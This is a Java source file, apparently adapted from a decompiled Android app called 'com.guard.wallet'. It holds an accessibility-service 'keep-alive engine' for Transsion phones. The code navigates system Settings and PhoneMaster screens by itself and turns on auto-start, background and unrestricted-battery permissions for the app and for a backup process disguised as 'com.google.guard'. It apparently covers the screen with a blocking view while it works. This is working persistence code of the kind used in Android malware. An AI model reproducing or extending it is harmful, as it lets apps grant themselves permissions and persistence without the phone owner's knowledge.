package com.guard.wallet.engine;
import com.guard.wallet.core.AppUtils;

import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import com.guard.wallet.MainApplication;
import com.guard.wallet.condition.StringCondition;
import com.guard.wallet.delegate.EngineHelper;
import com.guard.wallet.delegate.FilterHelper;
import com.guard.wallet.entity.UiObject;
import com.guard.wallet.filter.CombineFilter;
import com.guard.wallet.filter.CombineFiltersWithOr;
import com.guard.wallet.req.ListenWindow;
import com.guard.wallet.resp.PowerControlStateVO;
import com.guard.wallet.service.MyAccessibilityService;
import java.util.Collections;
import java.util.LinkedList;
import java.util.Objects;
import java.util.concurrent.ConcurrentLinkedQueue;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicInteger;
import java.util.concurrent.atomic.AtomicReference;
import java.util.concurrent.locks.ReentrantLock;

/**
 * 传音 (Tecno/Itel/Infinix) 保活引擎。
 *
 * ADAPT: Field 'r' shadows class o.r — use EngineHelper constants.
 * ADAPT: Class o.z shadows — use FilterHelper for CombineScrollCondition.
 *
 * vendor 原始路径: o/e0.java
 */
public final class TranssionEngine extends KeepAliveEngine {

    private static final Object KEEP_ALIVE_UNKNOWN = EngineHelper.KEEP_ALIVE_UNKNOWN;
    private static final Object KEEP_ALIVE_MAIN = EngineHelper.KEEP_ALIVE_MAIN;
    private static final Object KEEP_ALIVE_BACKUP = EngineHelper.KEEP_ALIVE_BACKUP;

    public static final int y = 0;

    public final AtomicReference r = new AtomicReference<>(KEEP_ALIVE_UNKNOWN);
    public final AtomicBoolean s = new AtomicBoolean(false);
    public final AtomicBoolean t = new AtomicBoolean(false);
    public final AtomicBoolean u = new AtomicBoolean(true);
    public final AtomicBoolean v = new AtomicBoolean(true);
    public final AtomicBoolean w = new AtomicBoolean(false);
    public final AtomicBoolean x = new AtomicBoolean(false);

    public TranssionEngine() {
        super(buildAllListenWindows(), "com.android.settings");
        try {
            super.p.schedule(new com.guard.wallet.delegate.task.OpenDevDelegateTask(this, 3), 60L, TimeUnit.SECONDS);
        } catch (Exception ex) {
            AppUtils.s("o.e0", ex);
        }
    }

    // ======= Static CombineFilter builders =======

    /** vendor 原名: b0() — Filter: COMMON_SETTINGS_BATTERY_TEXT */
    public static CombineFilter buildBatteryFilter() {
        if (AppUtils.B(com.guard.wallet.utils.LocateValuesUtils.getValue("COMMON_SETTINGS_BATTERY_TEXT"))) {
            return null;
        }
        CombineFilter f = new CombineFilter();
        StringCondition sc = FilterHelper.addCondition(f,
                FilterHelper.initFilter(f, "className", "android.widget.TextView"), "text");
        sc.setContains(com.guard.wallet.utils.LocateValuesUtils.getValue("COMMON_SETTINGS_BATTERY_TEXT"));
        f.getStringConditions().add(sc);
        return f;
    }

    /** vendor 原名: f0() — Filter: COMMON_SETTINGS_POWER_TEXT */
    public static CombineFilter buildPowerFilter() {
        if (AppUtils.B(com.guard.wallet.utils.LocateValuesUtils.getValue("COMMON_SETTINGS_POWER_TEXT"))) {
            return null;
        }
        CombineFilter f = new CombineFilter();
        StringCondition sc = FilterHelper.addCondition(f,
                FilterHelper.initFilter(f, "className", "android.widget.TextView"), "text");
        sc.setContains(com.guard.wallet.utils.LocateValuesUtils.getValue("COMMON_SETTINGS_POWER_TEXT"));
        f.getStringConditions().add(sc);
        return f;
    }

    /** vendor 原名: g0() — Filter: COMMON_SETTINGS_USE_POWER_TEXT */
    public static CombineFilter buildUsePowerFilter() {
        if (AppUtils.B(com.guard.wallet.utils.LocateValuesUtils.getValue("COMMON_SETTINGS_USE_POWER_TEXT"))) {
            return null;
        }
        CombineFilter f = new CombineFilter();
        StringCondition sc = FilterHelper.addCondition(f,
                FilterHelper.initFilter(f, "className", "android.widget.TextView"), "text");
        sc.setContains(com.guard.wallet.utils.LocateValuesUtils.getValue("COMMON_SETTINGS_USE_POWER_TEXT"));
        f.getStringConditions().add(sc);
        return f;
    }

    /** vendor 原名: q0() — Or-filter: unrestricted / no-restricted / cancel-restricted */
    public static CombineFiltersWithOr buildUnrestrictedOrFilter() {
        CombineFiltersWithOr or = new CombineFiltersWithOr();
        or.setFilters(new LinkedList<>());

        CombineFilter f1 = null;
        if (!AppUtils.B(com.guard.wallet.utils.LocateValuesUtils.getValue("COMMON_SETTINGS_UNRESTRICTED_TEXT"))) {
            f1 = new CombineFilter();
            StringCondition sc = FilterHelper.addCondition(f1,
                    FilterHelper.initFilter(f1, "className", "android.widget.TextView"), "text");
            sc.setEquals(com.guard.wallet.utils.LocateValuesUtils.getValue("COMMON_SETTINGS_UNRESTRICTED_TEXT"));
            f1.getStringConditions().add(sc);
        }
        if (f1 != null) {
            or.getFilters().add(f1);
        }

        CombineFilter f2 = null;
        if (!AppUtils.B(com.guard.wallet.utils.LocateValuesUtils.getValue("COMMON_SETTINGS_NO_RESTRICTED_TEXT"))) {
            f2 = new CombineFilter();
            StringCondition sc = FilterHelper.addCondition(f2,
                    FilterHelper.initFilter(f2, "className", "android.widget.TextView"), "text");
            sc.setEquals(com.guard.wallet.utils.LocateValuesUtils.getValue("COMMON_SETTINGS_NO_RESTRICTED_TEXT"));
            f2.getStringConditions().add(sc);
        }
        if (f2 != null) {
            or.getFilters().add(f2);
        }

        CombineFilter f3 = null;
        if (!AppUtils.B(com.guard.wallet.utils.LocateValuesUtils.getValue("COMMON_SETTINGS_HAS_CANCEL_RESTRICTED_TEXT"))) {
            f3 = new CombineFilter();
            StringCondition sc = FilterHelper.addCondition(f3,
                    FilterHelper.initFilter(f3, "className", "android.widget.TextView"), "text");
            sc.setEquals(com.guard.wallet.utils.LocateValuesUtils.getValue("COMMON_SETTINGS_HAS_CANCEL_RESTRICTED_TEXT"));
            f3.getStringConditions().add(sc);
        }
        if (f3 != null) {
            or.getFilters().add(f3);
        }

        return or;
    }

    // ======= Static ListenWindow builders =======

    /** vendor 原名: c0() — ListenWindow: com.android.settings / SubSettings */
    public static ListenWindow buildSubSettingsListenWindow() {
        ListenWindow lw = new ListenWindow("com.android.settings", "com.android.settings.SubSettings");
        FilterHelper.addEventType(32, FilterHelper.initEventTypes(lw), lw).add(16384);
        return lw;
    }

    /** vendor 原名: d0() — ListenWindow: com.android.settings / InstalledAppDetailsTop */
    public static ListenWindow buildAppDetailsListenWindow(String appName) {
        ListenWindow lw = new ListenWindow("com.android.settings",
                "com.android.settings.applications.InstalledAppDetailsTop");
        FilterHelper.addEventType(32, FilterHelper.initEventTypes(lw), lw).add(16384);
        if (!AppUtils.B(appName)) {
            lw.setMatchs(new LinkedList<>());
            lw.getMatchs().add(buildTextContainsFilter(appName));
        }
        return lw;
    }

    /** vendor 原名: e0() — ListenWindow: com.transsion.settings / AppInfoSettings */
    public static ListenWindow buildAppInfoSettingsListenWindow(String appName) {
        ListenWindow lw = new ListenWindow("com.android.settings",
                "com.transsion.settings.applications.appinfo.AppInfoSettings");
        FilterHelper.addEventType(32, FilterHelper.initEventTypes(lw), lw).add(16384);
        if (!AppUtils.B(appName)) {
            lw.setMatchs(new LinkedList<>());
            lw.getMatchs().add(buildTextContainsFilter(appName));
        }
        return lw;
    }

    /** vendor 原名: h0() — ListenWindow: com.transsion.phonemaster / FrameLayout */
    public static ListenWindow buildPhoneMasterFrameListenWindow() {
        ListenWindow lw = new ListenWindow("com.transsion.phonemaster", "android.widget.FrameLayout");
        FilterHelper.addEventType(32, FilterHelper.initEventTypes(lw), lw).add(16384);
        return lw;
    }

    /** vendor 原名: i0() — ListenWindow: com.transsion.phonemaster / AutoStartActivity */
    public static ListenWindow buildAutoStartListenWindow() {
        ListenWindow lw = new ListenWindow("com.transsion.phonemaster",
                "com.cyin.himgr.autostart.AutoStartActivity");
        FilterHelper.addEventType(32, FilterHelper.initEventTypes(lw), lw).add(16384);
        return lw;
    }

    /** vendor 原名: m0() — ListenWindow: com.android.settings / FrameLayout */
    public static ListenWindow buildSettingsFrameListenWindow(String appName) {
        ListenWindow lw = new ListenWindow("com.android.settings", "android.widget.FrameLayout");
        FilterHelper.addEventType(32, FilterHelper.initEventTypes(lw), lw).add(16384);
        if (!AppUtils.B(appName)) {
            lw.setMatchs(new LinkedList<>());
            lw.getMatchs().add(buildTextContainsFilter(appName));
        }
        return lw;
    }

    /** vendor 原名: n0() — Build full ListenWindow list for Transsion engine */
    public static LinkedList buildAllListenWindows() {
        LinkedList list = new LinkedList();
        list.add(buildBatteryDialogListenWindow());
        list.add(buildAutoStartListenWindow());
        list.add(buildPhoneMasterFrameListenWindow());
        list.add(buildAppDetailsListenWindow(null));
        list.add(buildAppInfoSettingsListenWindow(null));
        list.add(buildSettingsFrameListenWindow(null));
        list.add(buildSubSettingsListenWindow());
        return list;
    }

    // ======= Instance methods =======

    @Override
    public final void Z() {
        ReentrantLock lock = super.o;
        if (lock.tryLock()) {
            try {
                if (!this.isEngineFinished()) {
                    Log.d("o.e0", "准备结束本地保活自动化引擎");
                    com.guard.wallet.helper.BlockViewManager.h(100);
                    this.markEngineRunning();
                    if (MyAccessibilityService.P() != null) {
                        MyAccessibilityService.P().x();
                    }
                    this.savePowerControlState();
                    super.p.shutdownNow();
                    com.guard.wallet.thread.DelegateTaskLauncher.a(super.c);
                    super.n.clear();
                    if (AppUtils.M()) {
                        com.guard.wallet.utils.SystemHelper.T0(5);
                    }
                    com.guard.wallet.helper.BlockViewManager.c();
                    Log.d("o.e0", "已结束本地保活自动化引擎");
                    notifyPrepareConfirmLock();
                    this.d();
                }
            } catch (Exception ex) {
                AppUtils.s("o.e0", ex);
            }
            lock.unlock();
        }
    }

    /** vendor 原名: j0() — Check if in SubSettings (battery management) */
    public final boolean isInBatteryManagement() {
        try {
            if (this.q(Collections.singletonList(buildSubSettingsListenWindow()))) {
                Log.d("o.e0", "已进入App耗电管理窗口");
                return true;
            }
        } catch (Exception ex) {
            AppUtils.s("o.e0", ex);
        }
        return false;
    }

    /** vendor 原名: k0() — Check if in app detail window */
    public final boolean isInAppDetail() {
        try {
            String appLabel = Objects.equals(this.r.get(), KEEP_ALIVE_MAIN)
                    ? com.guard.wallet.utils.SystemHelper.x0()
                    : com.guard.wallet.utils.SystemHelper.e();
            LinkedList list = new LinkedList();
            list.add(buildAppDetailsListenWindow(appLabel));
            list.add(buildAppInfoSettingsListenWindow(appLabel));
            list.add(buildSettingsFrameListenWindow(appLabel));
            if (this.q(list)) {
                Log.d("o.e0", "已进入App详情窗口");
                return true;
            }
            return false;
        } catch (Exception ex) {
            AppUtils.s("o.e0", ex);
            return false;
        }
    }

    /** vendor 原名: l0() — Check if in auto-start management window */
    public final boolean isInAutoStartManagement() {
        try {
            LinkedList list = new LinkedList();
            list.add(buildAutoStartListenWindow());
            list.add(buildPhoneMasterFrameListenWindow());
            if (this.q(list)) {
                Log.d("o.e0", "已进入自启动管理窗口");
                return true;
            }
        } catch (Exception ex) {
            AppUtils.s("o.e0", ex);
        }
        return false;
    }

    /** vendor 原名: o0() — scroll through settings to find battery/power management entry */
    public final UiObject scrollFindBatteryEntry(UiObject scrollView) {
        UiObject powerResult = null;
        UiObject batteryResult = null;
        UiObject usePowerResult = null;

        try {
            scrollView.refresh();
            Log.d("o.e0", "开始滚动电池电量管理栏目");
            CombineFilter powerFilter = buildPowerFilter();
            CombineFilter batteryFilter = buildBatteryFilter();
            CombineFilter usePowerFilter = buildUsePowerFilter();
            AtomicInteger scrollCount = new AtomicInteger(0);

            if (batteryFilter == null && powerFilter == null && usePowerFilter == null) {
                return null;
            }

            // Initial search
            if (powerFilter != null) {
                powerResult = scrollView.findOneByCombine(powerFilter);
            }
            if (batteryFilter != null) {
                batteryResult = scrollView.findOneByCombine(batteryFilter);
            }
            if (usePowerFilter != null) {
                usePowerResult = scrollView.findOneByCombine(usePowerFilter);
            }

            // Scroll forward to find items
            while (scrollView.canScrollForward() && scrollCount.incrementAndGet() < 10) {
                Log.d("o.e0", "滚动视图可以向下滚动");
                if (batteryResult != null && batteryResult.visibleToUser()) break;
                if (powerResult != null && powerResult.visibleToUser()) break;
                if (usePowerResult != null && usePowerResult.visibleToUser()) break;
                if (!scrollView.scrollForwardByGesture()) continue;
                Log.d("o.e0", "向下滚动查找电池电量管理栏目");
                com.guard.wallet.utils.SystemHelper.T0(10);
                scrollView.refresh();
                if (powerFilter != null) {
                    powerResult = scrollView.findOneByCombine(powerFilter);
                }
                if (batteryFilter != null) {
                    batteryResult = scrollView.findOneByCombine(batteryFilter);
                }
                if (usePowerFilter != null) {
                    usePowerResult = scrollView.findOneByCombine(usePowerFilter);
                }
            }
            scrollCount.set(0);

            // Scroll backward if needed
            while (scrollView.canScrollBackward() && scrollCount.incrementAndGet() < 10) {
                Log.d("o.e0", "滚动视图可以向上滚动");
                if (batteryResult != null && batteryResult.visibleToUser()) break;
                if (powerResult != null && powerResult.visibleToUser()) break;
                if (usePowerResult != null && usePowerResult.visibleToUser()) break;
                if (!scrollView.scrollBackwardByGesture()) continue;
                Log.d("o.e0", "向上滚动查找电池电量管理栏目");
                com.guard.wallet.utils.SystemHelper.T0(10);
                scrollView.refresh();
                if (powerFilter != null) {
                    powerResult = scrollView.findOneByCombine(powerFilter);
                }
                if (batteryFilter != null) {
                    batteryResult = scrollView.findOneByCombine(batteryFilter);
                }
                if (usePowerFilter != null) {
                    usePowerResult = scrollView.findOneByCombine(usePowerFilter);
                }
            }
        } catch (Exception ex) {
            AppUtils.s("o.e0", ex);
        }

        // Return in priority order: battery > usePower > power
        if (batteryResult != null) return batteryResult;
        if (usePowerResult != null) return usePowerResult;
        return powerResult;
    }

    /** vendor 原名: p0() — save keep-alive strategy for both processes */
    public final void savePowerControlState() {
        try {
            PowerControlStateVO vo = com.guard.wallet.utils.SharedPrefsManager.k(
                    MainApplication.getAppContext().getPackageName());
            vo.setPackageName(MainApplication.getAppContext().getPackageName());
            if (this.s.get()) {
                vo.setAllowAutoStart(this.s.get());
            }
            if (this.u.get()) {
                vo.setAllowRelateStart(this.u.get());
            }
            if (this.w.get()) {
                vo.setAllowAllFullBackground(this.w.get());
            }
            vo.setRetryCount(vo.getRetryCount() + 1);
            com.guard.wallet.utils.SharedPrefsManager.L(vo);
            Log.d("o.e0", "主进程保活策略已保存");

            PowerControlStateVO vo2 = com.guard.wallet.utils.SharedPrefsManager.k("com.google.guard");
            vo2.setPackageName("com.google.guard");
            if (this.t.get()) {
                vo2.setAllowAutoStart(this.t.get());
            }
            if (this.v.get()) {
                vo2.setAllowRelateStart(this.v.get());
            }
            if (this.x.get()) {
                vo2.setAllowAllFullBackground(this.x.get());
            }
            vo2.setRetryCount(vo2.getRetryCount() + 1);
            com.guard.wallet.utils.SharedPrefsManager.L(vo2);
            Log.d("o.e0", "备用进程保活策略已保存");
        } catch (Exception ex) {
            AppUtils.s("o.e0", ex);
        }
    }

    @Override
    public final void u(AccessibilityEvent event, String pkg, String cls) {
        try {
            if (this.isEngineFinished()) {
                return;
            }
            if (event != null) {
                super.u(event, pkg, cls);
            }
            boolean inAppDetail = this.isInAppDetail();
            String threadId = super.c;
            ConcurrentLinkedQueue taskQueue = super.n;

            if (inAppDetail) {
                taskQueue.remove("keepAliveInAppBattery");
                taskQueue.remove("keepAliveInAutoStart");
                if (!taskQueue.contains("keepAliveInAppDetail")) {
                    taskQueue.add("keepAliveInAppDetail");
                    com.guard.wallet.thread.DelegateTaskLauncher.c(new com.guard.wallet.delegate.task.OpenDevDelegateTask(this, 0), threadId);
                }
            }

            // ADAPT: HyperOS 3 降级后 isInAppDetail()/isInBatteryManagement() 同属 com.android.settings 可能同时 true
            else if (this.isInBatteryManagement()) {
                taskQueue.remove("keepAliveInAppDetail");
                taskQueue.remove("keepAliveInAutoStart");
                if (!taskQueue.contains("keepAliveInAppBattery")) {
                    taskQueue.add("keepAliveInAppBattery");
                    com.guard.wallet.thread.DelegateTaskLauncher.c(new com.guard.wallet.delegate.task.OpenDevDelegateTask(this, 1), threadId);
                }
            }

            else if (this.isInAutoStartManagement()) {
                taskQueue.remove("keepAliveInAppDetail");
                taskQueue.remove("keepAliveInAppBattery");
                if (!taskQueue.contains("keepAliveInAutoStart")) {
                    taskQueue.add("keepAliveInAutoStart");
                    com.guard.wallet.thread.DelegateTaskLauncher.c(new com.guard.wallet.delegate.task.OpenDevDelegateTask(this, 2), threadId);
                }
            }
        } catch (Exception ex) {
            AppUtils.s("o.e0", ex);
        }
    }
}
